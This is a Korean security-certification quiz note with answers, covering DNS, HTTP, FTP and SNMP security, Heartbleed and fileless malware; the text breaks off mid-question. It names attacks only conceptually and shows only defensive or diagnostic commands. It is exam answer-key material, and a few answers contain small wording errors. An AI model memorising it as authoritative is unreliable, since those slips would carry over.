---
title: quiz-application
tags: []
aliases: []
date modified: 2026-03-05 10:16:35 +09:00
date created: 2026-02-25 10:46:47 +09:00
---

## [7] 애플리케이션 기본 학습

<details>
<summary>(서술형) 악성코드가 파일 시스템에 설치되지 않고, 윈도우의 <code>PowerShell</code>, <code>WMI</code>, 레지스트리 등 정상적인 시스템 도구와 메모리 자원만을 악용하여 실행되는 '파일리스(Fileless) 악성코드'의 특징과 전통적인 백신(Anti-Virus) 프로그램이 이를 탐지하기 어려운 이유를 서술하시오.</summary>
<blockquote>
<strong>특징</strong>: 하드디스크에 실행 파일(<code>.exe</code>) 형태의 흔적을 남기지 않고 시스템의 메모리(RAM) 상에서만 동작한다.<br>
<strong>탐지 어려운 이유</strong>: 전통적인 백신은 주로 디스크에 저장된 파일의 시그니처(해시값)를 기반으로 악성코드를 탐지하지만, 파일리스 악성코드는 파일 자체가 없고 정상적인 OS 내장 도구를 사용하여 실행되므로 시그니처 기반 검사를 우회하기 때문이다.
</blockquote>
</details>

<details>
<summary>(단답형) 전자상거래 지불 프로토콜에서 주문 정보와 지불 정보를 각각 해시한 후 이를 합쳐 다시 해시하여 서명함으로써, 상점은 지불 정보를 알 수 없고 은행은 주문 내용을 알 수 없게 만드는 기술의 명칭을 쓰시오.</summary>
<blockquote>
이중 서명 (Dual Signature)
</blockquote>
</details>

<details>
<summary>(기출 23회 10번 문제) (단답형) OpenSSL의 하트비트(Heartbeat) 확장 기능에서 데이터 길이에 대한 검증 미흡으로 인해 서버 메모리의 민감 정보(64KB)가 유출될 수 있는 취약점(CVE-2014-0160)의 명칭은?</summary>
<blockquote>
<strong>Heartbleed (하트블리드)</strong>
</blockquote>
</details>

### DNS(Domain Name System)

<details>
<summary>[기출 20회 9번 문제] (단답형) 클라우드 서비스 이용 중지 후에도 DNS의 CNAME 설정을 삭제하지 않아, 공격자가 해당 도메인을 피싱 사이트 등으로 악용하는 공격 방식을 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>서브도메인 하이재킹 (Subdomain Takeover)</strong>
</blockquote>
</details>

<details>
<summary>[기출 21회 16번 문제] (실무형) MASTER와 SLAVE DNS 서버의 존파일 설정과 관련하여 (A)~(F)에 들어갈 내용을 기술하시오.<br>
- Master DNS 서버 설정: <code>zone "korea.co.kr" IN { type (A); ... allow-update {(B)}; };</code><br>
- Master 존파일 레코드: <code>ns1 IN A (C)</code>, <code>ns2 IN A (D)</code><br>
- Slave DNS 서버 설정: <code>zone "korea.co.kr" IN { type (E); ... masters {(F)}; };</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>master</strong>, (B) <strong>192.168.1.2</strong> (Slave IP), (C) <strong>192.168.1.1</strong>, (D) <strong>192.168.1.2</strong>, (E) <strong>slave</strong>, (F) <strong>192.168.1.1</strong> (Master IP)
</blockquote>
</details>

<details>
<summary>[기출 22회 8번 문제] (단답형) DNS 서비스와 관련하여 ( )안에 들어갈 용어를 기술하시오.<br>
1. DNS 서비스는 53번 포트를 사용하고 전송 계층 프로토콜로 (A)를 사용한다.<br>
2. DNS 서버는 반복적인 질의로 상위 DNS에 가해지는 부하를 줄이기 위해 (B)를 사용하는데, 해당 정보가 유지되는 기간을 (C)이라고 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP</strong>, (B) <strong>캐시 (Cache)</strong>, (C) <strong>TTL (Time To Live)</strong><br>
※ 해설: 존 전송(Zone Transfer) 등 대량의 데이터 전송 시에는 TCP를 사용하기도 하지만, 일반적인 질의는 UDP를 사용함
</blockquote>
</details>


<details>
<summary>[415] (단답형) 다음 빈칸에 적절한 용어를 쓰시오.<br>
( A )은/는 도메인(Domain) 이름과 ( B )을/를 변환하여 주는 거대한 분산 데이터베이스 시스템으로, 해당 도메인에 대한 정보는 위임받은 서버의 ( C )에 저장된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>DNS (Domain Name System)</strong>, (B) <strong>IP 주소</strong>, (C) <strong>존(Zone) 파일</strong>
</blockquote>
</details>

<details>
<summary>[416] (단답형) 도메인(Domain) 이름은 호스트(서버)를 식별하기 위한 인터넷 주소로 사람들이 기억하기 쉽고 의미 있게 붙인 이름이지만, 인터넷에서 어떤 컴퓨터를 실제로 찾기 위해서는 숫자 체계로 된 IP 주소가 필요하다. 이를 위해 만들어진 시스템으로 도메인 이름과 IP 주소 변환 서비스를 제공하는 것은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNS (Domain Name System)</strong>
</blockquote>
</details>

<details>
<summary>[417] (단답형) 도메인명(Domain Name)에 대한 IP 주소가 저장된 파일로, 운영체제에서 DNS 서버에 질의하기 전에 가장 먼저 참조하는 설정 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code> 파일 (리눅스: <code>/etc/hosts</code>, 윈도우: <code>%SystemRoot%\system32\drivers\etc\hosts</code>)
</blockquote>
</details>

<details>
<summary>[418] (단답형) 윈도우, 유닉스/리눅스, 맥 등의 시스템에서 DNS 서버에 대한 질의를 수행하지 않고 도메인에 대한 IP 주소를 알아내기 위해 사용하는 설정 파일명을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code> 파일
</blockquote>
</details>

<details>
<summary>[419] (단답형) 윈도우 PC 환경에서 DNS 스푸핑 공격에 대응하기 위해서는 주요 접속 서버의 도메인명에 대한 IP 주소를 (  ) 파일에 저장한다.</summary>
<blockquote>
<strong>정답:</strong> <code>hosts</code>
</blockquote>
</details>

<details>
<summary>[420] (서술형) **파밍(Pharming)** 공격의 원리를 <code>hosts</code> 파일 변조 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 공격자가 사용자 PC에 악성코드를 감염시켜 <code>hosts</code> 파일을 조작함으로써, 사용자가 정상적인 도메인 주소를 입력하더라도 공격자가 미리 설정해둔 가짜 사이트(해커의 서버) IP로 접속하도록 리다이렉트하여 개인정보나 금융정보를 탈취하는 공격 기법이다.
</blockquote>
</details>

<details>
<summary>[421] (작업형) 윈도우 시스템에서 현재 메모리에 저장된 **로컬 DNS 캐시 정보**를 확인하는 명령와, 캐시된 정보를 강제로 삭제(초기화)하는 명령어를 각각 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) 확인: <code>ipconfig /displaydns</code><br>
2) 삭제: <code>ipconfig /flushdns</code>
</blockquote>
</details>

<details>
<summary>[422] (작업형/분석) 유닉스/리눅스 시스템에서 DNS 서버 질의를 위해 참조하는 다음 설정 파일들의 역할을 쓰시오.<br>
(A) <code>/etc/hosts</code><br>
(B) <code>/etc/resolv.conf</code></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <code>/etc/hosts</code>: IP 주소와 호스트 네임 간의 매핑 정보를 로컬에 저장하며, 외부 DNS 서버 질의보다 우선순위가 높다.<br>
(B) <code>/etc/resolv.conf</code>: 시스템이 사용할 기본 DNS 서버의 IP 주소(nameserver)와 검색 도메인을 등록하는 설정 파일이다.
</blockquote>
</details>

<details>
<summary>[423] (단답형) 윈도우 시스템에서 일반적으로 사용하지 않는 인터넷 연결 공유(ICS) 시 특정 클라이언트의 IP를 강제로 지정하는 기능을 하는 파일로, 악성코드 제작자가 백신이 주시하는 <code>hosts</code> 대신 변조하여 파밍 사이트로 유도할 수 있는 이 파일의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <code>hosts.ics</code> 파일
</blockquote>
</details>

<details>
<summary>[424] (단답형) 윈도우 DNS 서버 설정 시, 관리하는 도메인을 DNS 서버에 등록하는 ( A )와/과 DNS 서버에 서비스 정보를 입력하는 ( B )이 있다. 빈칸을 채우시오.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>존 설정</strong>, (B) <strong>리소스 레코드 설정</strong>
</blockquote>
</details>

<details>
<summary>[425] (단답형) DNS 서비스는 53번 포트를 사용하고 전송 계층에서 ( A ) 프로토콜을 사용한다. DNS 서버는 상위 DNS 서버에 빈번하게 반복적인 질의를 요청하여 부하가 발생하는 것을 막기 위해 ( B )을/를 사용하고 그 유효기간을 ( C )이라 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP/TCP</strong> (기본은 UDP, 512바이트 초과나 존 전송 시 TCP), (B) <strong>캐시(Cache)</strong>, (C) <strong>TTL (Time To Live)</strong>
</blockquote>
</details>

<details>
<summary>[426] (단답형) 클라이언트의 DNS 질의에 대한 응답 결과를 캐시에 일정 시간 저장하고 있다가 같은 DNS 질의가 들어오면 저장해 둔 정보를 이용하여 즉시 응답해주는 DNS 서버를 무엇이라 하는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Recursive (또는 Cache) DNS 서버</strong>
</blockquote>
</details>

<details>
<summary>[427] (단답형) DNS 서버(BIND) 운영 시 버전 정보가 노출되면 해당 버전의 취약점을 이용한 공격에 악용될 수 있다. 버전 정보를 보여주지 않기 위해 <code>named.conf</code> 파일에서 설정하는 지문(options 내)을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>version "unknown";</code> (또는 임의의 문자열 설정)
</blockquote>
</details>

<details>
<summary>[428] (단답형) 취약한 DNS 서버에 조작된 쿼리를 전송하여 DNS 서버가 저장하고 있는 주소 정보를 임의로 변조하는 공격의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNS 캐시 포이즈닝 (Cache Poisoning)</strong> 공격
</blockquote>
</details>

<details>
<summary>[429] (서술형) **DNS 캐시 포이즈닝** 공격의 원리와 이를 통해 달성하려는 공격 목표를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
<strong>원리</strong>: Recursive DNS 서버가 상위 Authoritative DNS 서버로 보낸 질의에 대해, 공격자가 진짜 서버보다 빠른 응답(포징된 패킷)을 보내 가짜 도메인 정보를 DNS 서버의 캐시에 저장시키는 공격이다.<br>
<strong>목표</strong>: 해당 DNS 서버를 이용하는 다수의 사용자들이 특정 도메인을 요청할 때 공격자가 의도한 가짜 사이트로 접속하게 만드는 대규모 피싱/파밍 공격을 목표로 한다.
</blockquote>
</details>

<details>
<summary>[430] (단답형) DNS 질의 및 응답 과정에서 데이터의 출처 인증(Source Authentication)과 무결성(Integrity)을 보장하기 위해 공개키 암호화 기술과 디지털 서명을 적용한 DNS 보안 확장 표준의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>DNSSEC</code> (Domain Name System Security Extensions)
</blockquote>
</details>

<details>
<summary>[431] (단답형) 파밍(Pharming) 공격은 ISP 캐시 DNS 서버나 사용자 PC에 특정 도메인 네임에 대한 위·변조된 IP 주소가 저장되도록 하는 공격이다. 이와 같은 DNS 데이터의 위·변조를 방지하기 위한 인터넷 표준 기술은?</summary>
<blockquote>
<strong>정답:</strong> <code>DNSSEC</code>
</blockquote>
</details>

<details>
<summary>[432] (작업형/분석) 다음은 BIND DNS 서버의 <code>named.conf</code> 설정 일부이다. 슬레이브(Slave) 네임서버(192.168.2.53)에게만 **존 전송(Zone Transfer)**을 허용하도록 빈칸을 채우시오.<br>
<code>zone "algisa.com" IN {</code><br>
<code>  type master;</code><br>
<code>  file "algisa.com.zone";</code><br>
<code>  <strong>(  A  )</strong> { 192.168.2.53; };</code><br>
<code>};</code></summary>
<blockquote>
<strong>정답:</strong> <code>allow-transfer</code>
</blockquote>
</details>

<details>
<summary>[433] (작업형) 마스터 DNS 서버에서 **iptables**를 사용하여 슬레이브 서버(IP: secondary.dns.ip)로부터의 존 전송 요청(TCP 53번 포트)만 허용하고 그 외의 모든 53번 접근을 차단하는 설정을 빈칸 (A), (B)를 채워 완성하시오.<br>
<code># iptables -A INPUT -s secondary.dns.ip -p <strong>( A )</strong> --dport <strong>( B )</strong> -j ACCEPT</code><br>
<code># iptables -A INPUT -s 0/0 -p <strong>( A )</strong> --dport <strong>( B )</strong> -j DROP</code></summary>
<blockquote>
<strong>정답:</strong> (A) <code>tcp</code>, (B) <code>53</code> (존 전송은 데이터 신뢰성을 위해 TCP 53번 포트를 사용한다)
</blockquote>
</details>

<details>
<summary>[434] (서술형) DNS의 주요 **리소스 레코드(Resource Record)** 유형 중 다음 2가지의 명칭과 용도를 설명하시오.<br>
(A) <strong>MX</strong><br>
(B) <strong>CNAME</strong></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>MX (Mail Exchanger)</strong>: 해당 도메인에 수신되는 이메일을 처리할 메일 서버의 주소와 우선순위를 지정한다.<br>
(B) <strong>CNAME (Canonical Name)</strong>: 기존 도메인 이름(별칭)을 실제 도메인 이름(본명)으로 매핑할 때 사용한다.
</blockquote>
</details>

<details>
<summary>[435] (단답형) 기업 내부의 DNS 설정에서 더 이상 사용하지 않는 서비스의 도메인명이 외부의 특정 서비스(예: 클라우드 스토리지, GitHub Pages 등)를 **CNAME**으로 가리키고 있을 때, 공격자가 해당 외부 서비스의 권한을 획득하여 정상적인 서브도메인 접속자들을 가짜 사이트로 유인하는 공격의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>서브도메인 탈취 (Subdomain Takeover)</strong> 또는 Subdomain Hijacking
</blockquote>
</details>

<details>
<summary>[436] (단답형) DNS 서버를 테스트하기 위해 도메인 이름으로 IP 주소를 조회하거나, 반대로 IP 주소로 도메인 이름을 조회하는 등의 질의를 수행하는 대표적인 명령어를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>nslookup</code> (또는 <code>dig</code>, <code>host</code>)
</blockquote>
</details>

<details>
<summary>(기출 23회 18번 문제) (작업형) <code>named.conf</code> 설정을 통해 DNS 마스터(Master)와 슬레이브(Slave) 서버 간의 존 전송(Zone Transfer) 및 업데이트 권한을 구성하려고 한다. 다음 빈칸 (A), (B)를 채우시오.
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
[Master 설정]<br>
zone "korea.co.kr" IN {<br>
&nbsp;&nbsp;type <strong>( A )</strong>;<br>
&nbsp;&nbsp;file "korea.co.kr.zone";<br>
&nbsp;&nbsp;allow-update { 192.168.2.53; };<br>
};<br>
<br>
[Slave 설정]<br>
zone "korea.co.kr" IN {<br>
&nbsp;&nbsp;type <strong>( B )</strong>;<br>
&nbsp;&nbsp;file "slave/korea.co.kr";<br>
&nbsp;&nbsp;masters { 192.168.1.53; };<br>
};
</div>
</summary>
<blockquote>
(A) <strong>master</strong><br>
(B) <strong>slave</strong>
</blockquote>
</details>

### HTTP(HyperText Transfer Protocol) 보안

<details>
<summary>[기출 22회 4번 문제] (단답형) HTTP Request 입력값에 개행문자가 포함되면 HTTP 응답이 2개 이상으로 분리되어 악의적인 코드를 삽입할 수 있는 공격이 가능해진다. 위에서 언급한 개행 문자 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>CR (%0D)</strong>, <strong>LF (%0A)</strong>
</blockquote>
</details>

<details>
<summary>[기출 22회 15번 문제] (서술형) 다음의 쿠키 설정값(Secure, HttpOnly, Expires)의 의미를 보안 측면에서 설명하시오.</summary>
<blockquote>
1. <strong>Secure</strong>: HTTPS 프로토콜을 통해서만 쿠키를 전송하게 하여 중간자 공격(MITM)에 의한 스니핑을 방지함<br>
2. <strong>HttpOnly</strong>: JavaScript(document.cookie)를 통한 쿠키 접근을 원천 차단하여 XSS 공격에 의한 세션 토큰 탈취를 방지함<br>
3. <strong>Expires</strong>: 쿠키의 유효 기간을 설정하여, 브라우저 종료 후에도 남아있는 영구 쿠키의 노출 위험을 제한함
</blockquote>
</details>

<details>
<summary>[기출 13회 4번 문제] (서술형) XSS 공격 시 자바스크립트에 의한 쿠키 탈취는 방지하지만, 네트워크 상의 패킷 가로채기를 통한 세션 하이재킹은 단독으로 방지하지 못하는 쿠키 속성의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>HttpOnly</strong><br>
<strong>해석:</strong> <code>HttpOnly</code> 속성은 클라이언트 사이드 스크립트(JS)의 쿠키 접근을 차단하여 XSS에 의한 탈취를 막지만, 네트워크 상의 스니핑을 통한 세션 하이재킹을 방지하려면 <code>Secure</code> 속성을 함께 보완적으로 사용해야 함.
</blockquote>
</details>


<details>
<summary>[437] (서술형) HTTP의 <strong>상태 비저장(Stateless)</strong> 특성을 극복하기 위한 기술인 '쿠키(Cookie)'와 '세션(Session)'의 저장 위치와 보안성 측면에서의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>쿠키(Cookie)</strong>: 클라이언트(브라우저) 측에 저장된다. 클라이언트에서 조작이 가능하고 네트워크 전송 시 노출 위험이 있어 보안성이 상대적으로 낮다. 민감한 정보는 암호화(HttpOnly, Secure 속성 등)가 권장된다.<br>
- <strong>세션(Session)</strong>: 서버 측에 상태 정보를 저장하고 클라이언트에게는 세션 ID만 부여한다. 데이터가 서버에 상주하므로 클라이언트의 직접적인 조작이 불가능하여 쿠키보다 보안성이 높다.
</blockquote>
</details>

### HTTP(HyperText Transfer Protocol)

<details>
<summary>[기출 20회 1번 문제] (단답형) 다음은 웹 서버의 지원 메소드를 확인하는 과정이다. ( )에 들어갈 HTTP 메소드는?<br>
<code>root@kali:~# Telnet webserver.com 80</code><br>
<code>( ) * HTTP/1.1</code><br>
<code>Allow: GET, HEAD, POST, OPTIONS, TRACE</code></summary>
<blockquote>
<strong>정답:</strong> <strong>OPTIONS</strong>
</blockquote>
</details>


<details>
<summary>[438] (작업형/분석) 텔넷(Telnet)을 통해 웹 서버에 접속한 후, 서버에서 지원하는 HTTP 메소드(Method) 목록을 확인하기 위해 사용할 수 있는 <strong>( A )</strong> 메소드와 그 결과를 해석하시오.<br>
<code>$ telnet 127.0.0.1 80</code><br>
<code><strong>(  A  )</strong> / HTTP/1.1</code><br>
<code>Host: 127.0.0.1</code></summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>OPTIONS</strong><br>
<strong>해석</strong>: 서버 응답 헤더의 <code>Allow</code> 항목(예: GET, POST, OPTIONS, TRACE 등)을 통해 해당 웹 서버가 허용하는 메소드 종류를 파악할 수 있다. 불필요한 메소드(PUT, DELETE, TRACE 등)가 활성화되어 있을 경우 보안 취약점이 될 수 있다.
</blockquote>
</details>

<details>
<summary>[439] (단답형/작업형) 다음 주요 **HTTP 상태 코드(Status Code)**의 의미를 각각 쓰시오.<br>
(A) <code>200 OK</code>: <strong>(  A  )</strong><br>
(B) <code>301 Moved Permanently</code>: <strong>(  B  )</strong><br>
(C) <code>403 Forbidden</code>: <strong>(  C  )</strong><br>
(D) <code>404 Not Found</code>: <strong>(  D  )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>요청이 성공적으로 수행됨</strong>, (B) <strong>요청 자원의 위치가 영구적으로 변경됨</strong>, (C) <strong>요청한 자원에 대한 접근 차단</strong>, (D) <strong>요청한 자원이 존재하지 않음</strong>
</blockquote>
</details>

<details>
<summary>[440] (단답형/작업형) 웹 서버 로그 분석 결과 다음과 같은 상태 코드가 확인되었다. 빈칸을 채우시오.<br>
1) <code>400</code>: <strong>(  A  )</strong><br>
2) <code>404</code>: <strong>(  B  )</strong><br>
3) <code>504</code>: <strong>(  C  )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Bad Request</strong> (메시지 문법 오류 등), (B) <strong>Not Found</strong>, (C) <strong>Gateway Timeout</strong> (프록시 응답 지연 등)
</blockquote>
</details>

<details>
<summary>[441] (단답형) 다음 HTTP 상태 코드의 의미를 쓰시오.<br>
1) <code>200</code>: <strong>(  A  )</strong><br>
2) <code>404</code>: <strong>(  B  )</strong><br>
3) <code>500</code>: <strong>(  C  )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>OK</strong>, (B) <strong>Not Found</strong>, (C) <strong>Internal Server Error</strong>
</blockquote>
</details>

### FTP(File Transfer Protocol) 보안

<details>
<summary>[442] (단답형) 다음 빈칸에 적절한 용어를 쓰시오.<br>
( A )은/는 인터넷상에서 컴퓨터 간에 파일(File)을 교환하기 위한 표준 프로토콜이다. ( A ) 동작 모드에는 ( B ) 모드와 ( C ) 모드가 있는데 일반적으로 ( C ) 모드를 사용한다. 유닉스/리눅스 시스템에서 ( A ) 사용자에 대한 접근 제한(차단 리스트)은 ( D ) 파일에서 설정 가능하다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>FTP</strong>, (B) <strong>능동(Active)</strong>, (C) <strong>수동(Passive)</strong>, (D) <strong>ftpusers</strong>
</blockquote>
</details>

<details>
<summary>[443] (단답형) FTP 동작 모드 중, 인증 요청과 데이터 송수신 요청을 모두 클라이언트 쪽에서 서버로 시도하는 방식을 (   ) 모드라고 한다.</summary>
<blockquote>
<strong>정답:</strong> <strong>수동(Passive)</strong> 모드
</blockquote>
</details>

<details>
<summary>[444] (서술형) FTP의 두 가지 동작 모드인 **Active(능동) 모드**와 **Passive(수동) 모드**의 데이터 채널 연결 방식의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>Active 모드</strong>: 클라이언트가 서버의 21번 포트로 접속(제어 채널)한 후, 서버가 클라이언트가 알려준 포트로 **역접속**(데이터 채널)하여 데이터를 전송한다. 클라이언트 측 방화벽 설정에 따라 차단될 수 있다.<br>
- <strong>Passive 모드</strong>: 클라이언트가 서버의 21번 포트로 접속한 후, 서버가 알려주는 임의의 높은 포트(1024 이상)로 **클라이언트가 직접 접속**(데이터 채널)하여 데이터를 전송한다. 서버 측 방화벽에서 데이터 채널용 포트 범위를 허용해줘야 한다.
</blockquote>
</details>

<details>
<summary>[445] (작업형) FTP 동작 방식에 따른 포트 접속 방향과 관련하여 빈칸을 채우시오.<br>
1) Active 모드에서 데이터 채널을 위해 사용하는 서버측 포트: <strong>( A )</strong><br>
2) Passive 모드에서 데이터 채널을 위해 사용하는 서버쪽 대기 포트: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>20/tcp</strong>, (B) <strong>1024번 이상의 임의의 포트</strong>
</blockquote>
</details>

<details>
<summary>[446] (단답형) FTP 동작 모드에 대한 설명이다. 빈칸을 채우시오.<br>
능동 모드는 서버의 ( A ) 포트를 이용하여 접속하고 ( B ) 포트를 이용하여 데이터를 전송한다. 수동 모드는 서버의 ( A ) 포트를 이용하여 접속하고 1024/tcp 이상의 포트를 이용하여 데이터를 전송한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>21/tcp</strong>, (B) <strong>20/tcp</strong>
</blockquote>
</details>

<details>
<summary>[447] (단답형) 유닉스/리눅스 시스템에서 특정 계정(예: root)의 FTP 접속을 제한하기 위해 차단할 계정명을 등록해두는 설정 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>/etc/ftpusers</code>
</blockquote>
</details>

<details>
<summary>[448] (서술형) **FTP 바운스 공격(FTP Bounce Attack)**의 원리와 이를 이용해 공격자가 얻으려는 목적을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원리</strong>: FTP의 Active 모드가 <code>PORT</code> 명령어를 통해 데이터 채널을 임의의 IP/포트로 연결할 수 있다는 취약점을 이용한다. 공격자가 자신의 위치를 숨기고 FTP 서버를 경유하여 타겟 시스템의 포트 활성화 여부를 스캔하는 방식이다.<br>
- <strong>목적</strong>: 공격자의 IP를 은폐(익명성 확보)하고, 외부에서 직접 접근이 불가능한 내부망 시스템의 포트를 스캔하거나 공격하는 경로로 활용한다.
</blockquote>
</details>

<details>
<summary>[450] (단답형) 읽기 전용 메모리나 디스크가 없는 워크스테이션에 설치될 수 있을 정도로 매우 단순하고 간단한 파일 송수신 프로토콜이다. 69/udp 포트를 사용하며 별도의 인증 과정 없이 지정된 디렉터리에 접근할 수 있는 취약점이 있다. 이 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>TFTP (Trivial FTP)</strong>
</blockquote>
</details>

<details>
<summary>[451] (작업형) <code>inetd</code> 슈퍼데몬 설정 파일(<code>inetd.conf</code>)에 <code>in.tftpd</code> 서비스 설정을 하려고 한다. 보안상 지정한 디렉토리의 상위 디렉토리로 이동하지 못하도록 하는(secure mode) 빈칸에 적절한 옵션을 쓰시오.<br>
<code>tftp dgram udp wait root /usr/sbin/in.tftpd in.tftpd <strong>( A )</strong> /tftpboot</code></summary>
<blockquote>
<strong>정답:</strong> <code>-s</code>
</blockquote>
</details>

<details>
<summary>[452] (단답형) 파일 전송 서비스 운영 시 발생할 수 있는 공격들에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 주로 부팅 이미지를 클라이언트에게 전달할 목적으로 UDP 69번 포트를 사용하며 인증 과정이 없는 프로토콜에 대한 공격이다.<br>
( B ): 패스워드를 요구하지 않는 FTP 설정의 취약점을 이용한 공격이다.<br>
( C ): <code>PORT</code> 명령어를 사용하여 FTP 서버로 하여금 공격자가 원하는 곳으로 데이터를 전송하게 하는 공격이다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>TFTP 공격</strong>, (B) <strong>Anonymous FTP 공격</strong>, (C) <strong>FTP Bounce 공격</strong>
</blockquote>
</details>

### SNMP(Simple Network Management Protocol) 보안

<details>
<summary>[기출 21회 2번 문제] (단답형) 라우터에서 SNMP 프로토콜을 비활성화하기 위해 ( )에 들어갈 명령어를 기술하시오.<br>
<code>Router(config)# (A) (B)</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>no</strong>, (B) <strong>snmp-server</strong> (전체 명령: <code>no snmp-server</code>)
</blockquote>
</details>


<details>
<summary>[453] (단답형) SNMP는 OSI 7계층의 ( A ) 계층 프로토콜이며, 전송 계층 프로토콜로 ( B )을/를 사용한다. 일반적인 SNMP 질의는 161번 포트, SNMP TRAP 메시지는 ( C )번 포트로 전송된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>응용 (Application)</strong>, (B) <strong>UDP</strong>, (C) <strong>162</strong>
</blockquote>
</details>

<details>
<summary>[454] (단답형) TCP/IP 네트워크 장치로부터 여러 관리 정보를 자동으로 수집하고 실시간으로 상태를 모니터링 및 설정할 수 있는 인터넷 표준 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SNMP (Simple Network Management Protocol)</strong>
</blockquote>
</details>

<details>
<summary>[455] (단답형) 네트워크 관리를 위해 시스템이나 네트워크 장비에 설정하는 프로토콜로, 원격 실시간 상태 모니터링 등의 기능을 수행하지만 시그니처가 평문 전송되는 등의 보안 취약점이 존재하는 프로토콜은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SNMP</strong>
</blockquote>
</details>

<details>
<summary>[456] (단답형) SNMP 취약점에 대한 설명이다. 빈칸을 채우시오.<br>
SNMP에서 매니저와 에이전트가 데이터를 교환하기 전에 인증하는 일종의 패스워드로 초기값은 ( A ) 또는 private 등으로 설정되어 있다. 또한 SNMP는 읽기만 가능한 RO와 읽기/쓰기가 가능한 ( B ) 모드를 제공한다. 최신 버전인 ( C )에서는 인증 및 암호화가 제공된다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>community string</strong> (또는 public), (B) <strong>RW (Read/Write)</strong>, (C) <strong>SNMP Version 3</strong>
</blockquote>
</details>

<details>
<summary>[457] (단답형) 네트워크 장비 관리 및 모니터링을 위한 프로토콜인 SNMP가 사용하는 전송 계층 프로토콜과 기본 포트 번호를 각각 쓰시오.<br>
1) SNMP(Get/Set 요청): <strong>( A )</strong> / <strong>( B )</strong><br>
2) SNMP Trap(통보): <strong>( A )</strong> / <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>UDP</strong>, (B) <strong>161번</strong>, (C) <strong>162번</strong>
</blockquote>
</details>

<details>
<summary>[458] (단답형) SNMP는 <code>get-request</code>, <code>get-response</code>, <code>trap</code> 등의 메시지로 구성되어 있다. 다음 빈칸을 채우시오.<br>
1) Trap 메시지는 <strong>( A )</strong>번 포트를 사용하고, 그 외의 메시지들은 <strong>( B )</strong>번 포트를 사용한다.<br>
2) 관리되어야 할 정보나 객체들을 모아놓은 집합체를 <strong>( C )</strong>라고 한다.<br>
3) MIB를 정의하기 위한 일반적인 구조와 문법을 정의하는 언어를 <strong>( D )</strong>라고 하며, 메시지 전송 시 비트 변환을 담당하는 규칙을 <strong>( E )</strong>라고 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>162/udp</strong>, (B) <strong>161/udp</strong>, (C) <strong>MIB</strong>, (D) <strong>SMI</strong> (또는 ASN.1), (E) <strong>BER</strong>
</blockquote>
</details>

<details>
<summary>[459] (단답형) SNMP의 데이터 수집 방식에 대한 설명이다. 빈칸을 채우시오.<br>
매니저가 에이전트에게 정보를 요청하면 에이전트가 응답하는 방식을 <strong>( A )</strong> 방식이라 하고, 이때 UDP 161번 포트를 사용한다. 반사회 에이전트가 이벤트 발생 시 이를 매니저에게 알리는 방식을 <strong>( B )</strong> 방식이라 하고, 이때 매니저의 UDP 162번 포트를 사용한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>폴링(Polling)</strong>, (B) <strong>이벤트 리포팅(Event Reporting)</strong> (또는 Trap)
</blockquote>
</details>

<details>
<summary>[460] (단답형) 네트워크 장비는 NMS를 통해 관리된다. NMS 서버는 <strong>( A )</strong> 방식으로 장비 상태를 수집하고, 장비의 특정 이벤트 발생 시 <strong>( B )</strong> 방식으로 실시간 보고를 받는다. 또한 장비에서 발생하는 실시간 로그 정보를 <strong>( C )</strong> 방식으로 전송하기도 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Polling</strong>, (B) <strong>Event Reporting</strong>, (C) <strong>syslog</strong>
</blockquote>
</details>

<details>
<summary>[461] (단답형) 다음 설명에 해당하는 용어를 각각 쓰시오.<br>
1) 다양한 장비의 로그 메시지를 원격 로그 수집기로 보내 분석하기 위한 UDP 기반의 인터넷 표준 프로토콜: <strong>( A )</strong><br>
